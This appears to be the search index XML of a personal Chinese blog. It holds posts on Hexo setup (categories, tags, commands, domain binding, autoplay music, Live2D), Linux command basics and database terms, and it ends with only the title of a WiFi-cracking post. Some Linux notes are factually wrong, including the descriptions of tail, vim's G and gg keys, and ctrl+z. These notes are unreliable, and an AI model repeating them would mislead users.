<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo使用攻略-添加分类及标签</title>
    <url>/2021/03/25/Hexo%E4%BD%BF%E7%94%A8%E6%94%BB%E7%95%A5-%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE/</url>
    <content><![CDATA[<h2 id="1、创建“分类”选项"><a href="#1、创建“分类”选项" class="headerlink" title="1、创建“分类”选项"></a>1、创建“分类”选项</h2><h3 id="1-1-生成“分类”页并添加tpye属性"><a href="#1-1-生成“分类”页并添加tpye属性" class="headerlink" title="1.1 生成“分类”页并添加tpye属性"></a>1.1 生成“分类”页并添加tpye属性</h3><p>打开命令行，进入博客所在文件夹。执行命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new page categories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>生成categories后打开，找到index.md这个文件，打开后默认内容是这样的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---
title: 文章分类
date: <span class="token number">2021</span>-03-25 <span class="token number">21</span>:19:07
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>添加type: “categories”到内容中，添加后是这样的：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---
title: 文章分类
date: <span class="token number">2021</span>-03-25 <span class="token number">21</span>:19:07
type: <span class="token string">"categories"</span>
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1-2-给文章添加“categories”属性"><a href="#1-2-给文章添加“categories”属性" class="headerlink" title="1.2 给文章添加“categories”属性"></a>1.2 给文章添加“categories”属性</h3><p>打开需要添加分类的文章，为其添加categories属性。下方的categories: web前端表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---
title: 分类
date: <span class="token number">2021</span>-03-25 <span class="token number">21</span>:19:07
categories: hexo
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="2、创建“标签”选项"><a href="#2、创建“标签”选项" class="headerlink" title="2、创建“标签”选项"></a>2、创建“标签”选项</h2><h3 id="生成“标签”页并添加tpye属性"><a href="#生成“标签”页并添加tpye属性" class="headerlink" title="生成“标签”页并添加tpye属性"></a>生成“标签”页并添加tpye属性</h3><p>打开命令行，进入博客所在文件夹。执行命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new page tags<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>打开命令行，进入博客所在文件夹。执行命令</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new page categories<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>生成tags后打开，找到index.md这个文件，打开后默认内容是这样的</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---
title: 标签
date: <span class="token number">2017</span>-05-27 <span class="token number">14</span>:22:08
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>添加type: “tags”到内容中，添加后是这样的：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">---
title: 文章分类
date: <span class="token number">2021</span>-03-25 <span class="token number">21</span>:19:07
type: <span class="token string">"tags"</span>
---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后在文章中打上相应的tags就行了</p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>有关建站</title>
    <url>/2021/03/21/hello-world/</url>
    <content><![CDATA[<p>欢迎来到white-x(白筱)的小站 ! 这是根据B站教程利用github搭建的网站。</p>
<h2 id="hexo的基本指令"><a href="#hexo的基本指令" class="headerlink" title="hexo的基本指令"></a>hexo的基本指令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo -g   //安装  
<span class="token function">npm</span> update hexo -g 	  //升级 
hexo version  	      //查看hexo的版本
hexo init nodejs-hexo   //创建nodejs-hexo 名字的本地文件
hexo init nodejs-hexo    //创建博客
hexo init blog          //初始化，生成文件夹为blog
<span class="token builtin class-name">cd</span> blog  	             //进入blog文件夹
<span class="token function">npm</span> <span class="token function">install</span>            //安装依赖库
hexo generate           //生成一套静态网页
hexo server         //运行测试,浏览器打开地址，http://localhost:4000/
hexo deploy         //进行部署

hexo new <span class="token string">"new article"</span>  //新建文章‘new article’
hexo new page <span class="token string">"about"</span>  //新建页面 ‘about’

hexo n <span class="token string">"我的博客"</span><span class="token variable"><span class="token variable">`</span> <span class="token operator">==</span> <span class="token variable">`</span></span>hexo new<span class="token variable"><span class="token variable">`</span> <span class="token string">"我的博客"</span>    //新建文章
hexo g <span class="token operator">==</span> hexo generate        //生成<span class="token variable">`</span></span>
hexo s <span class="token operator">==</span> hexo server          //启动服务预览
hexo d <span class="token operator">==</span> hexo deploy          //部署<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Hexo文章属性设置"><a href="#Hexo文章属性设置" class="headerlink" title="Hexo文章属性设置"></a>Hexo文章属性设置</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">设置 - - - - 描述 - - - - Default
layout - - - - Layout - - - - post或page
title - - - - 文章的标题 - - - -
<span class="token function">date</span> - - - - 创建日期 - - - - 文件的创建日期
updated - - - - 修改日期 - - - - 文件的修改日期
comments - - - - 是否开启评论 - - - - <span class="token boolean">true</span>
tags - - - - 标签
categories - - - - 分类
permalink - - - - url中的名字 - - - - 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="github上hexo搭建博客-绑定域名"><a href="#github上hexo搭建博客-绑定域名" class="headerlink" title="github上hexo搭建博客-绑定域名"></a>github上hexo搭建博客-绑定域名</h2><p>这里选择阿里云域名<br>登陆阿里云控制台，选择域名，选择要绑定的域名，点解析<br>解析页，添加记录，<br>记录类型 A<br>主机记录 WWW, @<br>记录值 填写对应的github的ip地址<br>Github的ip地址获取<br>clone 你创建的仓库, 用户名.github.io<br>输入 ping www.用户名.github.io<br>Ping sni.github.map.fastly.net [151.202.68.147], IP地址<br>在source目录下创建这个CNAME文件，输入域名<br>提交代码，点击域名，一般很快就生效。</p>
<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% codeblock <span class="token punctuation">[</span>title<span class="token punctuation">]</span> <span class="token punctuation">[</span>lang:language<span class="token punctuation">]</span> <span class="token punctuation">[</span>url<span class="token punctuation">]</span> <span class="token punctuation">[</span>link text<span class="token punctuation">]</span> %<span class="token punctuation">&#125;</span>
code snippet
<span class="token punctuation">&#123;</span>% endcodeblock %<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="普通的代码块"><a href="#普通的代码块" class="headerlink" title="普通的代码块"></a>普通的代码块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% codeblock %<span class="token punctuation">&#125;</span>
alert<span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#123;</span>% endcodeblock %<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="指定语言"><a href="#指定语言" class="headerlink" title="指定语言"></a>指定语言</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% codeblock lang:objc %<span class="token punctuation">&#125;</span>
<span class="token punctuation">[</span>rectangle setX: <span class="token number">10</span> y: <span class="token number">10</span> width: <span class="token number">20</span> height: <span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#123;</span>% endcodeblock %<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="附加说明和网址"><a href="#附加说明和网址" class="headerlink" title="附加说明和网址"></a>附加说明和网址</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% codeblock _.compact http://underscorejs.org/<span class="token comment">#compact Underscore.js %&#125;</span>
_.compact<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span>, <span class="token number">1</span>, false, <span class="token number">2</span>, <span class="token string">''</span>, <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token number">1</span>, <span class="token number">2</span>, <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token punctuation">&#123;</span>% endcodeblock %<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Image-在文章中插入指定大小的图片。"><a href="#Image-在文章中插入指定大小的图片。" class="headerlink" title="Image 在文章中插入指定大小的图片。"></a>Image 在文章中插入指定大小的图片。</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% img <span class="token punctuation">[</span>class names<span class="token punctuation">]</span> /path/to/image <span class="token punctuation">[</span>width<span class="token punctuation">]</span> <span class="token punctuation">[</span>height<span class="token punctuation">]</span> <span class="token punctuation">[</span>title text <span class="token punctuation">[</span>alt text<span class="token punctuation">]</span><span class="token punctuation">]</span> %<span class="token punctuation">&#125;</span> 	//语法
<span class="token punctuation">&#123;</span>% img <span class="token punctuation">[</span>class names<span class="token punctuation">]</span> /yn.jpeg <span class="token punctuation">[</span><span class="token number">300</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>height<span class="token punctuation">]</span> <span class="token punctuation">[</span>云南风景 <span class="token punctuation">[</span>风景图片<span class="token punctuation">]</span><span class="token punctuation">]</span> %<span class="token punctuation">&#125;</span> 	//实例<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="Youtube"><a href="#Youtube" class="headerlink" title="Youtube"></a>Youtube</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">&#123;</span>% youtube video_id %<span class="token punctuation">&#125;</span> 	//语法
<span class="token punctuation">&#123;</span>% youtube ICkxRE_GdgI %<span class="token punctuation">&#125;</span>  //id在Url中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="插入音乐"><a href="#插入音乐" class="headerlink" title="插入音乐"></a>插入音乐</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> <span class="token operator">&lt;</span>audio <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">"display:none; height: 0"</span> <span class="token assign-left variable">id</span><span class="token operator">=</span><span class="token string">"bg-music"</span> <span class="token assign-left variable">preload</span><span class="token operator">=</span><span class="token string">"auto"</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"http://music.163.com/song/media/outer/url?id=1841002409.mp3"</span> <span class="token assign-left variable">loop</span><span class="token operator">=</span><span class="token string">"loop"</span><span class="token operator">></span><span class="token operator">&lt;</span>/audio<span class="token operator">></span>
<span class="token operator">&lt;</span>script<span class="token operator">></span>
    <span class="token variable"><span class="token variable">$(</span>document<span class="token variable">)</span></span>.ready<span class="token punctuation">(</span><span class="token function-name function">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            autoPlayMusic<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            audioAutoPlay<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function-name function">audioAutoPlay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            var audio <span class="token operator">=</span> document.getElementById<span class="token punctuation">(</span><span class="token string">'bg-music'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            audio.play<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            document.addEventListener<span class="token punctuation">(</span><span class="token string">"WeixinJSBridgeReady"</span>, <span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                audio.play<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>, <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        // 音乐播放
        <span class="token keyword">function</span> <span class="token function-name function">autoPlayMusic</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            // 自动播放音乐效果，解决浏览器或者APP自动播放问题
            <span class="token keyword">function</span> <span class="token function-name function">musicInBrowserHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                musicPlay<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>
                document.body.removeEventListener<span class="token punctuation">(</span><span class="token string">'touchstart'</span>, musicInBrowserHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            document.body.addEventListener<span class="token punctuation">(</span><span class="token string">'touchstart'</span>, musicInBrowserHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
            // 自动播放音乐效果，解决微信自动播放问题
            <span class="token keyword">function</span> <span class="token function-name function">musicInWeixinHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                musicPlay<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>
                document.addEventListener<span class="token punctuation">(</span><span class="token string">"WeixinJSBridgeReady"</span>, <span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    musicPlay<span class="token punctuation">(</span>true<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>, <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                document.removeEventListener<span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span>, musicInWeixinHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            document.addEventListener<span class="token punctuation">(</span><span class="token string">'DOMContentLoaded'</span>, musicInWeixinHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">function</span> musicPlay<span class="token punctuation">(</span>isPlay<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            var media <span class="token operator">=</span> document.querySelector<span class="token punctuation">(</span><span class="token string">'#bg-music'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>isPlay <span class="token operator">&amp;&amp;</span> media.paused<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                media.play<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>isPlay <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>media.paused<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                media.pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>

<span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Live2d</title>
    <url>/2021/03/23/live2d/</url>
    <content><![CDATA[<p>成功配置看板娘<a href="https://www.bilibili.com/video/BV1QW411w7Da?t=40">https://www.bilibili.com/video/BV1QW411w7Da?t=40</a></p>

<link rel="stylesheet" href="/live2d/css/live2d.css">

<body>
<div id="landlord">
    <div class="message" style="opacity:0"></div>
    <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
    <div class="hide-button">隐藏</div>
</div>
<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
    var message_Path = '/live2d/'
    var home_Path = 'https://white-x.top'
</script>
<script type="text/javascript" src="/live2d/js/live2d.js"></script>
<script type="text/javascript" src="/live2d/js/message.js"></script>
<script type="text/javascript">
    loadlive2d("live2d", "/live2d/model/tia/model.json");
</script>
</body>]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>hexo搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 基础</title>
    <url>/2021/07/10/linux-%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="linux-虚拟机安装"><a href="#linux-虚拟机安装" class="headerlink" title="linux 虚拟机安装"></a>linux 虚拟机安装</h2><ol>
<li>VMware 安装 然后使用镜像安装linux 配置网络 连接xshell</li>
<li>ssh -p 22 root@ip在win控制台直接连接linux</li>
<li>shutdown –h now 立该进行关机</li>
<li>shudown -h 1 “hello, 1 分钟后会关机了”</li>
<li>shutdown –r now 现在重新启动计算机</li>
<li>halt 关机，作用和上面一样.</li>
<li>reboot 现在重新启动计算机</li>
<li>sync 把内存的数据同步到磁盘.</li>
</ol>
<h2 id="其他操作"><a href="#其他操作" class="headerlink" title="其他操作"></a>其他操作</h2><ol>
<li>man [命令或配置文件]（功能描述：获得帮助信息）</li>
<li>help 命令 （功能描述：获得shell内置命令的帮助信息）</li>
<li>pwd [选项]（功能描述：显示当前工作目录的绝对路径）</li>
<li>ls [选项]显示目录文件</li>
<li>ll [选项]以列当前目录显示文件</li>
<li>cd [选项] 定位  ..上一级</li>
<li>ctrl+z 强制退出</li>
<li>ctrl+x 暂停</li>
</ol>
<h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><h3 id="pwd-选项-显示当前工作目录的绝对路径"><a href="#pwd-选项-显示当前工作目录的绝对路径" class="headerlink" title="pwd [选项] (显示当前工作目录的绝对路径)"></a>pwd [选项] (显示当前工作目录的绝对路径)</h3><h3 id="ls-选项-显示目录文件"><a href="#ls-选项-显示目录文件" class="headerlink" title="ls [选项]显示目录文件"></a>ls [选项]显示目录文件</h3><h3 id="ll-选项-以列当前目录显示文件"><a href="#ll-选项-以列当前目录显示文件" class="headerlink" title="ll [选项]以列当前目录显示文件"></a>ll [选项]以列当前目录显示文件</h3><h3 id="cd-选项-定位-上一级"><a href="#cd-选项-定位-上一级" class="headerlink" title="cd [选项] 定位  ..上一级"></a>cd [选项] 定位  ..上一级</h3><h3 id="mkdir-选项-名字-要创建的目录"><a href="#mkdir-选项-名字-要创建的目录" class="headerlink" title="mkdir [选项] [名字] 要创建的目录"></a>mkdir [选项] [名字] 要创建的目录</h3><ol>
<li>-p ：创建多级目录</li>
</ol>
<h3 id="rmdir-选项-名字-指令删除空目录"><a href="#rmdir-选项-名字-指令删除空目录" class="headerlink" title="rmdir [选项] [名字] 指令删除空目录"></a>rmdir [选项] [名字] 指令删除空目录</h3><h3 id="rm-选项-名字-指令移除文件或目录-小心删库-rf"><a href="#rm-选项-名字-指令移除文件或目录-小心删库-rf" class="headerlink" title="rm [选项][名字]   指令移除文件或目录 小心删库 -rf"></a>rm [选项][名字]   指令移除文件或目录 小心删库 -rf</h3><ol>
<li>-r ：递归删除整个文件夹 -f ： 强制删除不提示</li>
</ol>
<h3 id="touch指令创建空文件"><a href="#touch指令创建空文件" class="headerlink" title="touch指令创建空文件"></a>touch指令创建空文件</h3><h3 id="touch-文件名称"><a href="#touch-文件名称" class="headerlink" title="touch 文件名称"></a>touch 文件名称</h3><h3 id="cp-原文件-目标目录-拷贝文件"><a href="#cp-原文件-目标目录-拷贝文件" class="headerlink" title="cp [原文件] [目标目录] 拷贝文件"></a>cp [原文件] [目标目录] 拷贝文件</h3><ol>
<li>强制覆盖不提示的方法：\cp</li>
<li>-r ：递归复制整个文件夹</li>
</ol>
<h3 id="mv-移动文件与目录或重命名"><a href="#mv-移动文件与目录或重命名" class="headerlink" title="mv 移动文件与目录或重命名"></a>mv 移动文件与目录或重命名</h3><p>mv oldNameFile newNameFile (功能描述：重命名)<br>mv /temp/movefile /targetFolder (功能描述：移动文件)<br>mv [文件名] [路径] </p>
<h3 id="cat-名字-查看文件内容"><a href="#cat-名字-查看文件内容" class="headerlink" title="cat [名字]查看文件内容"></a>cat [名字]查看文件内容</h3><ol>
<li>-n ：显示行号</li>
</ol>
<h3 id="more-名字-基于vi的文本过滤器"><a href="#more-名字-基于vi的文本过滤器" class="headerlink" title="more[名字]基于vi的文本过滤器"></a>more[名字]基于vi的文本过滤器</h3><h3 id="less指令用来分屏查看文件内容（适用于大文件）"><a href="#less指令用来分屏查看文件内容（适用于大文件）" class="headerlink" title="less指令用来分屏查看文件内容（适用于大文件）"></a>less指令用来分屏查看文件内容（适用于大文件）</h3><ol>
<li>空白键 向下翻动一页；</li>
<li>[pagedown] 向下翻动一页</li>
<li>[pageup] 向上翻动一页；</li>
<li>/字串 向下搜寻『字串』的功能；n：向下查找；N：向上查找；</li>
<li>?字串 向上搜寻『字串』的功能；n：向上查找；N：向下查找；</li>
<li>q 离开 less 这个程序；</li>
</ol>
<h3 id="echo-选项-输出内容-输出内容到控制台。"><a href="#echo-选项-输出内容-输出内容到控制台。" class="headerlink" title="echo [选项] [输出内容] 输出内容到控制台。"></a>echo [选项] [输出内容] 输出内容到控制台。</h3><h3 id="head-用于显示文件的开头部分内容"><a href="#head-用于显示文件的开头部分内容" class="headerlink" title="head 用于显示文件的开头部分内容"></a>head 用于显示文件的开头部分内容</h3><ol>
<li>head 文件 (功能描述：查看文件头10行内容)</li>
<li>head -n 5 文件 (功能描述：查看文件头5行内容，5可以是任意行数)</li>
<li>默认情况下head指令显示文件的前10行内容</li>
</ol>
<h3 id="tail-选项-文件-前10行"><a href="#tail-选项-文件-前10行" class="headerlink" title="tail [选项] [文件] 前10行"></a>tail [选项] [文件] 前10行</h3><ol>
<li>tail 文件 （功能描述：查看文件头10行内容）</li>
<li>tail -n 5 文件 （功能描述：查看文件头5行内容，5可以是任意行数）</li>
<li>tail -f 文件 （功能描述：实时追踪该文档的所有更新）<br>日志查看 </li>
</ol>
<h3 id="文件追加"><a href="#文件追加" class="headerlink" title="文件追加"></a>文件追加</h3><ol>
<li>ls -l &gt;文件 （功能描述：列表的内容写入文件a.txt中（覆盖写））</li>
<li>ls -al &gt;&gt;文件 （功能描述：列表的内容追加到文件aa.txt的末尾）</li>
<li>cat 文件1 &gt; 文件2 （功能描述：将文件1的内容覆盖到文件2）</li>
<li>echo “内容”&gt;&gt; 文件</li>
</ol>
<h3 id="ln-s-原文件或目录-软链接名"><a href="#ln-s-原文件或目录-软链接名" class="headerlink" title="ln -s [原文件或目录] [软链接名]"></a>ln -s [原文件或目录] [软链接名]</h3><p>当我们使用pwd指令查看目录时，仍然看到的是软链接所在目录。</p>
<h3 id="find-name-‘文件名’"><a href="#find-name-‘文件名’" class="headerlink" title="find -name ‘文件名’"></a>find -name ‘文件名’</h3><ol>
<li>-name&lt;查询方式&gt; 按照指定的文件名查找模式查找文件</li>
<li>-user&lt;用户名&gt; 查找属于指定用户名所有文件</li>
<li>-size&lt;文件大小&gt; 按照指定的文件大小查找文件。</li>
</ol>
<h3 id="history指令-查看历史指令"><a href="#history指令-查看历史指令" class="headerlink" title="history指令 查看历史指令"></a>history指令 查看历史指令</h3><h3 id="date指令-显示当前日期"><a href="#date指令-显示当前日期" class="headerlink" title="date指令-显示当前日期"></a>date指令-显示当前日期</h3><ol>
<li>date （功能描述：显示当前时间）</li>
<li>date +%Y （功能描述：显示当前年份）</li>
<li>date +%m （功能描述：显示当前月份）</li>
<li>date +%d （功能描述：显示当前是哪一天）</li>
<li>date “+%Y-%m-%d %H:%M:%S”（功能描述：显示年月日时分秒）</li>
<li>date -s 字符串时间 设置时间</li>
</ol>
<h3 id="cal查看日历"><a href="#cal查看日历" class="headerlink" title="cal查看日历"></a>cal查看日历</h3><p>cal [选项]</p>
<h3 id="locate-搜索文件"><a href="#locate-搜索文件" class="headerlink" title="locate 搜索文件"></a>locate 搜索文件</h3><p>由于locate指令基于数据库进行查询，所以第一次运行前，必须使用updatedb指令创建locate数据库。</p>
<h2 id="tab-自动补全代码或者命令，连续按两次"><a href="#tab-自动补全代码或者命令，连续按两次" class="headerlink" title="[tab]自动补全代码或者命令，连续按两次"></a>[tab]自动补全代码或者命令，连续按两次</h2><h3 id="grep指令和-管道符号"><a href="#grep指令和-管道符号" class="headerlink" title="grep指令和 管道符号 |"></a>grep指令和 管道符号 |</h3><p>grep [选项] 查找内容 源文件</p>
<h3 id="gzip-gunzip-指令"><a href="#gzip-gunzip-指令" class="headerlink" title="gzip/gunzip 指令"></a>gzip/gunzip 指令</h3><ol>
<li>gzip 用于压缩文件， gunzip 用于解压的</li>
<li>gzip 文件 （功能描述：压缩文件，只能将文件压缩为*.gz文件）</li>
<li>gunzip 文件.gz （功能描述：解压缩文件命令）<h3 id="zip-unzip-指令"><a href="#zip-unzip-指令" class="headerlink" title="zip/unzip 指令"></a>zip/unzip 指令</h3></li>
<li>zip 用于压缩文件， unzip 用于解压的，这个在项目打包发布中很有用的</li>
<li>zip [选项] XXX.zip 将要压缩的内容（功能描述：压缩文件和目录的命令）</li>
<li>unzip [选项] XXX.zip （功能描述：解压缩文件） • zip常用选项</li>
</ol>
<p>-r：递归压缩，即压缩目录<br>4) unzip的常用选项<br>-d&lt;目录&gt; ：指定解压后文件的存放目录</p>
<h3 id="tar-指令"><a href="#tar-指令" class="headerlink" title="tar 指令"></a>tar 指令</h3><ol>
<li>tar 指令 是打包指令，最后打包后的文件是 .tar.gz 的文件。</li>
<li>tar [选项] XXX.tar.gz 打包的内容 (功能描述：打包目录，压缩后的文件格式.tar.gz) <h2 id="vim编辑器的使用-vi为打开文件"><a href="#vim编辑器的使用-vi为打开文件" class="headerlink" title="vim编辑器的使用 vi为打开文件"></a>vim编辑器的使用 vi为打开文件</h2>vim 有三种基本模式 普通模式 编辑模式 命令行模式</li>
<li>dd 删除该行</li>
<li>u: 撤销之前一次操作</li>
<li>yy 复制该行</li>
<li>p: 粘贴该行</li>
<li>esc 切换模式</li>
<li>:wq 保存退出</li>
<li>G 指定首行</li>
<li>gg指定尾行</li>
</ol>
<img src="https://images.cnblogs.com/cnblogs_com/zengyongjoy/Screenshot.png" class="[class names]" title="[300] [height] [1 [1]]">     

<h2 id="linux-安装-java"><a href="#linux-安装-java" class="headerlink" title="linux 安装 java"></a>linux 安装 java</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> java-devel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="java编译运行"><a href="#java编译运行" class="headerlink" title="java编译运行"></a>java编译运行</h2><ol>
<li>javac +文件名</li>
<li>java  +类名无后缀</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>关于数据库的专业术语和关系定义</title>
    <url>/2021/03/26/%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%93%E4%B8%9A%E6%9C%AF%E8%AF%AD%E5%92%8C%E5%85%B3%E7%B3%BB%E5%AE%9A%E4%B9%89/</url>
    <content><![CDATA[<h2 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h2><p>关系中的每一行称为一个元组，每一列称为一个属性，每一行对应的列的值为分量</p>
<h3 id="候选码与主码"><a href="#候选码与主码" class="headerlink" title="候选码与主码"></a>候选码与主码</h3><p>在关系中可以唯一标识一个元组的属性或属性组称为候选码，如果一个关系中有多个候选码，则选定其中最小的属性组为主码。<br>（1）如关系的候选码只有一个属性，称为单属性码。<br>（2）如关系中的候选码由多个属性构成，称为多属性码。<br>（3）如关系中只有一个候选码，且包含所有属性，称为全码。</p>
<h3 id="主属性与非主属性"><a href="#主属性与非主属性" class="headerlink" title="主属性与非主属性"></a>主属性与非主属性</h3><p>出现在候选码中的属性为主属性，不包含在任何候选码中的属性为非主属性<br><img src="https://img2.baidu.com/it/u=3037079685,1725325008&fm=15&fmt=auto&gp=0.jpg" alt="alt"></p>
]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Wifi 破解以及生成密码库</title>
